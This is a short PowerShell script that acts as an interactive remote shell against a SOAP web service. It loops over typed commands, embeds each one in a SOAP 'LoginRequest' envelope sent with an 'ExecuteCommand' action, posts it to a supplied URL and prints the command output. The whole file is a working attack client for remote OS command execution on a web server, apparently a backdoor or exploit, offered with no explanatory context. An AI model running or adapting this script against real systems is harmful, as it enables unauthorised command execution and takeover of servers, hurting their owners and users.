param (
    [string]$url
)

function Execute-Command {
    while ($true) {
        $cmd = Read-Host -Prompt "$ "
        $payload = "<?xml version=`"1.0`" encoding=`"utf-8`"?><soap:Envelope xmlns:soap=`"http://schemas.xmlsoap.org/soap/envelope/`" xmlns:xsi=`"http://www.w3.org/2001/XMLSchema-instance`" xmlns:tns=`"http://tempuri.org/`" xmlns:tm=`"http://microsoft.com/wsdl/mime/textMatching/`"><soap:Body><LoginRequest xmlns=`"http://tempuri.org/`"><cmd>$cmd</cmd></LoginRequest></soap:Body></soap:Envelope>"
        
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $payload -Headers @{"SOAPAction" = '"ExecuteCommand"'}
        
        try {
            $result_text = $response.Envelope.Body.LoginRequestResponse.result
            if (-not [string]::IsNullOrWhiteSpace($result_text)) {
                Write-Output $result_text.Trim()
            } else {
                Write-Output "Please enter a valid OS command"
            }
        } catch {
            Write-Output "Please enter a valid OS command"
        }
    }
}

Execute-Command
